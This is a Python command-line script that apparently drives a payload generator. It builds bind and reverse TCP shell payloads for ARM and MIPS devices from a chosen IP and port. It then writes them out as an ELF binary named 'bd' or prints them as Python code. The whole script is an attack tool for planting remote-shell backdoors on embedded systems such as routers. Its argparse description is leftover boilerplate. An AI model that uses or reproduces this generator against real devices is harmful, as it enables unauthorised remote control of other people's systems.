#!/usr/bin/env python

import argparse

from payloads.armle_reverse_tcp import armle_reverse_tcp
from payloads.mipsbe_reverse_tcp import mipsbe_reverse_tcp
from payloads.mipsle_reverse_tcp import mipsle_reverse_tcp
from payloads.armle_bind_tcp import armle_bind_tcp
from payloads.mipsle_bind_tcp import mipsle_bind_tcp
from payloads.mipsbe_bind_tcp import mipsbe_bind_tcp


def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('--arch', help='Architecture: mips, mipsel, arm', required=True)
    parser.add_argument('--tech', help='Technique: bind, reverse', required=True)
    parser.add_argument('--ip', help='IP address for reverse shell (if technique is reverse)', required=False)
    parser.add_argument('--port', help='Port number for bind/reverse shell', required=False)
    parser.add_argument('--out', help='Output format: elf, python', required=False)

    args = parser.parse_args()

    if args.arch == 'armle':
        if args.tech == 'bind':
            payload = armle_bind_tcp(args.port)
        elif args.tech == 'reverse':
            payload = armle_reverse_tcp(args.ip, args.port)
    elif args.arch == 'mipsle':
        if args.tech == 'bind':
            payload = mipsle_bind_tcp(args.port)
        elif args.tech == 'reverse':
            payload = mipsle_reverse_tcp(args.ip, args.port)
    elif args.arch == 'mipsbe':
        if args.tech == 'bind':
            payload = mipsbe_bind_tcp(args.port)
        elif args.tech == 'reverse':
            payload = mipsbe_reverse_tcp(args.ip, args.port)

    print(("Architecture: {}\n"
           "IP: {}\n"
           "Port: {}\n"
           "-----------------").format(args.arch, args.ip, args.port))

    if args.out == 'python':
        content = payload.generate_python()
        print(content)
    else:
        content = payload.generate_elf()
        path = "output/bd"

        print(("Length: {}\n"
               "Saving to: {}\n").format(len(content), path))

        with open(path, 'wb+') as f:
            f.write(content)
            f.close()


if __name__ == '__main__':
    main()
